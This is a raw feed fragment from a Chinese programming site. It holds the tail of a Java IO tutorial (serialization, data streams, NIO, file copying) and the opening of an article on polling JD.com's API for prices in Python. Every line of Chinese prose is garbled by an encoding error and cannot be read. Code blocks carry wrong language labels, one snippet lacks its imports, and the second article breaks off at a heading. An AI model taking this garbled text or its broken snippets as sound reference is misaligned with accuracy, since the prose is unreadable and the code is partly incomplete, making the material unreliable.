        <span class="hljs-built_in">this</span>.createTime = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();
    }
    
    <span class="hljs-comment">// getterå’Œsetteræ–¹æ³•</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"User{name='"</span> + name + <span class="hljs-string">"', createTime="</span> + createTime + <span class="hljs-string">"}"</span>;
    }
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializationExample</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serializeObject</span><span class="hljs-params">(User user, String filename)</span> {
        <span class="hljs-keyword">try</span> (<span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(filename))) {
            oos.writeObject(user);
            System.out.println(<span class="hljs-string">"å¯¹è±¡åºåˆ—åŒ–å®Œæˆ"</span>);
        } <span class="hljs-keyword">catch</span> (IOException e) {
            e.printStackTrace();
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> User <span class="hljs-title function_">deserializeObject</span><span class="hljs-params">(String filename)</span> {
        <span class="hljs-keyword">try</span> (<span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename))) {
            <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> (User) ois.readObject();
            System.out.println(<span class="hljs-string">"å¯¹è±¡ååºåˆ—åŒ–å®Œæˆ"</span>);
            <span class="hljs-keyword">return</span> user;
        } <span class="hljs-keyword">catch</span> (IOException | ClassNotFoundException e) {
            e.printStackTrace();
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">"å¼ ä¸‰"</span>, <span class="hljs-string">"123456"</span>);
        serializeObject(user, <span class="hljs-string">"user.ser"</span>);
        
        <span class="hljs-type">User</span> <span class="hljs-variable">deserializedUser</span> <span class="hljs-operator">=</span> deserializeObject(<span class="hljs-string">"user.ser"</span>);
        <span class="hljs-keyword">if</span> (deserializedUser != <span class="hljs-literal">null</span>) {
            System.out.println(<span class="hljs-string">"ååºåˆ—åŒ–ç»“æœ: "</span> + deserializedUser);
        }
    }
}
</code></pre>
<h3 data-id="heading-15">6.2 æ•°æ®æµæ“ä½œ</h3>
<p>æ•°æ®æµç”¨äºè¯»å†™åŸºæœ¬æ•°æ®ç±»å‹ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.io.*;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataStreamExample</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writePrimitiveData</span><span class="hljs-params">(String filename)</span> {
        <span class="hljs-keyword">try</span> (<span class="hljs-type">DataOutputStream</span> <span class="hljs-variable">dos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataOutputStream</span>(
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(filename))) {
            
            dos.writeInt(<span class="hljs-number">100</span>);
            dos.writeDouble(<span class="hljs-number">3.14159</span>);
            dos.writeBoolean(<span class="hljs-literal">true</span>);
            dos.writeUTF(<span class="hljs-string">"Hello, DataStream!"</span>);
            
            System.out.println(<span class="hljs-string">"åŸºæœ¬æ•°æ®ç±»å‹å†™å…¥å®Œæˆ"</span>);
        } <span class="hljs-keyword">catch</span> (IOException e) {
            e.printStackTrace();
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readPrimitiveData</span><span class="hljs-params">(String filename)</span> {
        <span class="hljs-keyword">try</span> (<span class="hljs-type">DataInputStream</span> <span class="hljs-variable">dis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataInputStream</span>(
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename))) {
            
            <span class="hljs-type">int</span> <span class="hljs-variable">intValue</span> <span class="hljs-operator">=</span> dis.readInt();
            <span class="hljs-type">double</span> <span class="hljs-variable">doubleValue</span> <span class="hljs-operator">=</span> dis.readDouble();
            <span class="hljs-type">boolean</span> <span class="hljs-variable">booleanValue</span> <span class="hljs-operator">=</span> dis.readBoolean();
            <span class="hljs-type">String</span> <span class="hljs-variable">stringValue</span> <span class="hljs-operator">=</span> dis.readUTF();
            
            System.out.println(<span class="hljs-string">"è¯»å–ç»“æœ:"</span>);
            System.out.println(<span class="hljs-string">"int: "</span> + intValue);
            System.out.println(<span class="hljs-string">"double: "</span> + doubleValue);
            System.out.println(<span class="hljs-string">"boolean: "</span> + booleanValue);
            System.out.println(<span class="hljs-string">"String: "</span> + stringValue);
            
        } <span class="hljs-keyword">catch</span> (IOException e) {
            e.printStackTrace();
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        writePrimitiveData(<span class="hljs-string">"data.bin"</span>);
        readPrimitiveData(<span class="hljs-string">"data.bin"</span>);
    }
}
</code></pre>
<h2 data-id="heading-16">ä¸ƒã€NIOç®€ä»‹ä¸æ¯”è¾ƒ</h2>
<p>Java NIOï¼ˆNew IOï¼‰æä¾›äº†æ›´é«˜æ•ˆçš„IOå¤„ç†æ–¹å¼ï¼š</p>
<h3 data-id="heading-17">7.1 ä¼ ç»ŸIO vs NIO</h3>






























<table><thead><tr><th>ç‰¹æ€§</th><th>ä¼ ç»ŸIO</th><th>NIO</th></tr></thead><tbody><tr><td><strong>æ•°æ®å¤„ç†æ–¹å¼</strong>â€‹</td><td>æµå¯¼å‘</td><td>ç¼“å†²åŒºå¯¼å‘</td></tr><tr><td><strong>é˜»å¡æ¨¡å¼</strong>â€‹</td><td>é˜»å¡IO</td><td>éé˜»å¡IOå¯é€‰</td></tr><tr><td><strong>é€‰æ‹©å™¨</strong>â€‹</td><td>ä¸æ”¯æŒ</td><td>æ”¯æŒ</td></tr><tr><td><strong>æ€§èƒ½</strong>â€‹</td><td>è¿æ¥æ•°å°‘æ—¶è‰¯å¥½</td><td>è¿æ¥æ•°å¤šæ—¶æ›´ä¼˜</td></tr></tbody></table>
<h3 data-id="heading-18">7.2 åŸºæœ¬NIOæ“ä½œç¤ºä¾‹</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> java.<span class="hljs-property">nio</span>.<span class="hljs-property">file</span>.*;
<span class="hljs-keyword">import</span> java.<span class="hljs-property">nio</span>.<span class="hljs-property">charset</span>.<span class="hljs-property">StandardCharsets</span>;
<span class="hljs-keyword">import</span> java.<span class="hljs-property">util</span>.<span class="hljs-property">List</span>;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NIOExample</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">nioReadFile</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> filename</span>) {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-title class_">Path</span> path = <span class="hljs-title class_">Paths</span>.<span class="hljs-title function_">get</span>(filename);
            <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">String</span>&gt; lines = <span class="hljs-title class_">Files</span>.<span class="hljs-title function_">readAllLines</span>(path, <span class="hljs-title class_">StandardCharsets</span>.<span class="hljs-property">UTF_8</span>);
            
            <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"NIOè¯»å–æ–‡ä»¶å†…å®¹:"</span>);
            <span class="hljs-keyword">for</span> (<span class="hljs-title class_">String</span> line : lines) {
                <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(line);
            }
        } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">IOException</span> e) {
            e.<span class="hljs-title function_">printStackTrace</span>();
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">nioWriteFile</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> filename, List&lt;<span class="hljs-built_in">String</span>&gt; content</span>) {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-title class_">Path</span> path = <span class="hljs-title class_">Paths</span>.<span class="hljs-title function_">get</span>(filename);
            <span class="hljs-title class_">Files</span>.<span class="hljs-title function_">write</span>(path, content, <span class="hljs-title class_">StandardCharsets</span>.<span class="hljs-property">UTF_8</span>);
            <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"NIOæ–‡ä»¶å†™å…¥å®Œæˆ"</span>);
        } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">IOException</span> e) {
            e.<span class="hljs-title function_">printStackTrace</span>();
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) {
        <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">String</span>&gt; content = <span class="hljs-title class_">List</span>.<span class="hljs-title function_">of</span>(<span class="hljs-string">"NIOç¬¬ä¸€è¡Œ"</span>, <span class="hljs-string">"NIOç¬¬äºŒè¡Œ"</span>, <span class="hljs-string">"NIOç¬¬ä¸‰è¡Œ"</span>);
        <span class="hljs-title function_">nioWriteFile</span>(<span class="hljs-string">"nio_example.txt"</span>, content);
        <span class="hljs-title function_">nioReadFile</span>(<span class="hljs-string">"nio_example.txt"</span>);
    }
}
</code></pre>
<h2 data-id="heading-19">å…«ã€å®è·µä¸æ€§èƒ½ä¼˜åŒ–</h2>
<h3 data-id="heading-20">8.1 æ‹·è´æ–‡ä»¶</h3>
<p>ä½¿ç”¨try-with-resourcesç¡®ä¿èµ„æºæ­£ç¡®å…³é—­ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">import</span> java.io.*;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BestPracticeExample</span> {
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">copyFileBestPractice</span><span class="hljs-params">(<span class="hljs-type">String</span> source, <span class="hljs-type">String</span> destination)</span> </span>{
        <span class="hljs-comment">// ä½¿ç”¨try-with-resourcesè‡ªåŠ¨å…³é—­èµ„æº</span>
        <span class="hljs-built_in">try</span> (InputStream in = <span class="hljs-keyword">new</span> <span class="hljs-built_in">FileInputStream</span>(source);
             OutputStream out = <span class="hljs-keyword">new</span> <span class="hljs-built_in">FileOutputStream</span>(destination)) {
            
            <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-type">byte</span>[<span class="hljs-number">8192</span>]; <span class="hljs-comment">// 8KBç¼“å†²åŒº</span>
            <span class="hljs-type">int</span> bytesRead;
            
            <span class="hljs-keyword">while</span> ((bytesRead = in.<span class="hljs-built_in">read</span>(buffer)) != <span class="hljs-number">-1</span>) {
                out.<span class="hljs-built_in">write</span>(buffer, <span class="hljs-number">0</span>, bytesRead);
            }
        } <span class="hljs-built_in">catch</span> (IOException e) {
            System.err.<span class="hljs-built_in">println</span>(<span class="hljs-string">"æ–‡ä»¶æ“ä½œå¤±è´¥: "</span> + e.<span class="hljs-built_in">getMessage</span>());
            <span class="hljs-comment">// é€‚å½“çš„é”™è¯¯å¤„ç†å’Œæ—¥å¿—è®°å½•</span>
        }
    }
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">String</span>[] args)</span> </span>{
        <span class="hljs-built_in">copyFileBestPractice</span>(<span class="hljs-string">"source.txt"</span>, <span class="hljs-string">"destination.txt"</span>);
    }
}
</code></pre>
<h3 data-id="heading-21">8.2 æ€§èƒ½ä¼˜åŒ–å»ºè®®</h3>
<ol>
<li><strong>ä½¿ç”¨ç¼“å†²æµ</strong>ï¼šå¯¹äºé¢‘ç¹çš„è¯»å†™æ“ä½œï¼Œå§‹ç»ˆä½¿ç”¨ç¼“å†²æµ</li>
<li><strong>é€‰æ‹©åˆé€‚çš„ç¼“å†²åŒºå¤§å°</strong>ï¼šé€šå¸¸8KBæ˜¯æ¯”è¾ƒç†æƒ³çš„ç¼“å†²åŒºå¤§å°</li>
<li><strong>åŠæ—¶å…³é—­èµ„æº</strong>ï¼šä½¿ç”¨try-with-resourcesç¡®ä¿èµ„æºé‡Šæ”¾</li>
<li><strong>é€‰æ‹©åˆé€‚çš„æµç±»å‹</strong>ï¼šæ–‡æœ¬æ•°æ®ç”¨å­—ç¬¦æµï¼ŒäºŒè¿›åˆ¶æ•°æ®ç”¨å­—èŠ‚æµ</li>
<li><strong>è€ƒè™‘ä½¿ç”¨NIO</strong>ï¼šå¯¹äºé«˜æ€§èƒ½è¦æ±‚çš„åœºæ™¯è€ƒè™‘ä½¿ç”¨NIO</li>
</ol>
<h2 data-id="heading-22">9. æ€»ç»“</h2>
<p>Java IOæä¾›äº†å¼ºå¤§è€Œçµæ´»çš„æ•°æ®å¤„ç†èƒ½åŠ›ï¼Œä¸»è¦åŒ…æ‹¬ï¼š</p>
<ol>
<li><strong>å­—èŠ‚æµ</strong>ç”¨äºå¤„ç†æ‰€æœ‰ç±»å‹çš„æ•°æ®ï¼Œç‰¹åˆ«æ˜¯äºŒè¿›åˆ¶æ•°æ®</li>
<li><strong>å­—ç¬¦æµ</strong>ä¸“é—¨ç”¨äºæ–‡æœ¬å¤„ç†ï¼Œæ”¯æŒå­—ç¬¦ç¼–ç </li>
<li><strong>ç¼“å†²æµ</strong>æé«˜IOæ“ä½œæ•ˆç‡</li>
<li><strong>å¯¹è±¡åºåˆ—åŒ–</strong>ç”¨äºå¯¹è±¡æŒä¹…åŒ–</li>
<li><strong>NIO</strong>æä¾›æ›´é«˜æ•ˆçš„IOå¤„ç†æ–¹æ¡ˆ</li>
</ol>
<p>æŒæ¡Java IOä½“ç³»å¯¹äºä»»ä½•Javaå¼€å‘è€…éƒ½æ˜¯å¿…å¤‡æŠ€èƒ½ï¼Œåˆç†çš„IOæ“ä½œèƒ½å¤Ÿæ˜¾è‘—æå‡åº”ç”¨ç¨‹åºçš„æ€§èƒ½å’Œç¨³å®šæ€§ã€‚å»ºè®®æ ¹æ®å…·ä½“éœ€æ±‚é€‰æ‹©åˆé€‚çš„IOç±»ï¼Œå¹¶éµå¾ªæœ€ä½³å®è·µæ¥ç¼–å†™å¥å£®çš„IOä»£ç ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è§£é”äº¬ä¸œAPIï¼Œå®æ—¶æŒæ¡å•†å“ä»·æ ¼åŠ¨æ€ï¼Œå®šä»·ç­–ç•¥æ›´çµæ´»ï¼]]></title>    <link>https://juejin.cn/post/7581428845683998763</link>    <guid>https://juejin.cn/post/7581428845683998763</guid>    <pubDate>2025-12-09T09:36:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581428845683998763" data-draft-id="7581413562487324678" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è§£é”äº¬ä¸œAPIï¼Œå®æ—¶æŒæ¡å•†å“ä»·æ ¼åŠ¨æ€ï¼Œå®šä»·ç­–ç•¥æ›´çµæ´»ï¼"/> <meta itemprop="keywords" content="API"/> <meta itemprop="datePublished" content="2025-12-09T09:36:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è´¸è¿å¤©ä¸‹"/> <meta itemprop="url" content="https://juejin.cn/user/3959775760754074"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è§£é”äº¬ä¸œAPIï¼Œå®æ—¶æŒæ¡å•†å“ä»·æ ¼åŠ¨æ€ï¼Œå®šä»·ç­–ç•¥æ›´çµæ´»ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3959775760754074/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è´¸è¿å¤©ä¸‹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T09:36:17.000Z" title="Tue Dec 09 2025 09:36:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>â€‹</p>
<p>Â åœ¨ç”µå•†ç«äº‰æ—¥ç›Šæ¿€çƒˆçš„ä»Šå¤©ï¼ŒæŒæ¡å•†å“ä»·æ ¼åŠ¨æ€å·²æˆä¸ºå•†å®¶åˆ¶å®šçµæ´»å®šä»·ç­–ç•¥çš„å…³é”®ã€‚æœ¬æ–‡å°†æ‰‹æŠŠæ‰‹æ•™ä½ å¦‚ä½•é€šè¿‡äº¬ä¸œAPIå®ç°å®æ—¶ä»·æ ¼ç›‘æ§ï¼Œä¸ºæ‚¨çš„å•†ä¸šå†³ç­–æä¾›æ•°æ®æ”¯æ’‘ã€‚</p>
<h4 data-id="heading-0">ä¸€ã€äº¬ä¸œAPIçš„ä»·å€¼è§£æ</h4>
<p>äº¬ä¸œå¼€æ”¾å¹³å°æä¾›äº†ä¸°å¯Œçš„APIæ¥å£ï¼Œå…¶ä¸­å•†å“ä»·æ ¼æŸ¥è¯¢æ¥å£ï¼ˆ<code>jd.union.open.goods.price.query</code>ï¼‰æ”¯æŒå®æ—¶è·å–å•†å“ä»·æ ¼ã€ä¿ƒé”€ä¿¡æ¯ç­‰å…³é”®æ•°æ®ã€‚é€šè¿‡è¯¥æ¥å£ï¼Œæ‚¨å¯ä»¥ï¼š</p>
<ol>
<li>ç›‘æ§ç«äº‰å¯¹æ‰‹ä»·æ ¼å˜åŠ¨</li>
<li>æ•æ‰ä¿ƒé”€æ´»åŠ¨å‘¨æœŸè§„å¾‹</li>
<li>å»ºç«‹åŠ¨æ€å®šä»·æ¨¡å‹</li>
<li>å®ç°åº“å­˜æ™ºèƒ½é¢„è­¦</li>
</ol>
<h4 data-id="heading-1">äºŒã€å®æˆ˜ï¼šæ„å»ºä»·æ ¼ç›‘æ§ç³»ç»Ÿ</h4>
<h5 data-id="heading-2">1. APIæ¥å…¥å‡†å¤‡</h5>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function">import requests

def <span class="hljs-title">get_jd_token</span>():
    # è·å–è®¿é—®ä»¤ç‰Œï¼ˆéœ€æå‰ç”³è¯·å¼€æ”¾å¹³å°æƒé™ï¼‰
    <span class="hljs-keyword">params</span></span> = {
        <span class="hljs-string">"app_key"</span>: <span class="hljs-string">"YOUR_APP_KEY"</span>,
        <span class="hljs-string">"app_secret"</span>: <span class="hljs-string">"YOUR_APP_SECRET"</span>,
        <span class="hljs-string">"grant_type"</span>: <span class="hljs-string">"access_token"</span>
    }
    response = requests.post(<span class="hljs-string">"https://oauth.jd.com/oauth/token"</span>, <span class="hljs-keyword">params</span>=<span class="hljs-keyword">params</span>)
    <span class="hljs-keyword">return</span> response.json().<span class="hljs-keyword">get</span>(<span class="hljs-string">"access_token"</span>)
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<h5 data-id="heading-3">2. å®æ—¶ä»·æ ¼è·å–</h5>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function">def <span class="hljs-title">fetch_real_time_price</span>(<span class="hljs-params">sku_id, token</span>):
    url</span> = <span class="hljs-string">"https://api.jd.com/routerjson"</span>
    payload = {
        <span class="hljs-string">"method"</span>: <span class="hljs-string">"jd.union.open.goods.price.query"</span>,
        <span class="hljs-string">"skuIds"</span>: sku_id,
        <span class="hljs-string">"access_token"</span>: token
    }
    headers = {<span class="hljs-string">"Content-Type"</span>: <span class="hljs-string">"application/json"</span>}
    response = requests.post(url, json=payload, headers=headers)
    <span class="hljs-keyword">return</span> response.json().<span class="hljs-keyword">get</span>(<span class="hljs-string">"data"</span>)[<span class="hljs-number">0</span>].<span class="hljs-keyword">get</span>(<span class="hljs-string">"priceInfo"</span>).<span class="hljs-keyword">get</span>(<span class="hljs-string">"price"</span>)
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<h4 data-id="heading-4">ä¸‰ã€æ•°æ®å­˜å‚¨ä¸åˆ†æ</h4>
<p>å»ºè®®ä½¿ç”¨æ—¶é—´åºåˆ—æ•°æ®åº“å­˜å‚¨ä»·æ ¼æ•°æ®ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"># InfluxDBç¤ºä¾‹
from influxdb_client import InfluxDBClient

def <span class="hljs-built_in">save_price_data</span>(sku_id, price):
    with <span class="hljs-built_in">InfluxDBClient</span>(url=<span class="hljs-string">"http://localhost:8086"</span>, token=<span class="hljs-string">"YOUR_TOKEN"</span>, org=<span class="hljs-string">"YOUR_ORG"</span>) as client:
        write_api = client.<span class="hljs-built_in">write_api</span>()
        point = <span class="hljs-built_in">Point</span>(<span class="hljs-string">"jd_price"</span>).<span class="hljs-built_in">tag</span>(<span class="hljs-string">"sku"</span>, sku_id).<span class="hljs-built_in">field</span>(<span class="hljs-string">"price"</span>, price).<span class="hljs-built_in">time</span>(datetime.<span class="hljs-built_in">utcnow</span>())
        write_api.<span class="hljs-built_in">write</span>(bucket=<span class="hljs-string">"YOUR_BUCKET"</span>, record=point)
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<h4 data-id="heading-5">å››ã€åŠ¨æ€å®šä»·ç­–ç•¥å®ç°</h4>
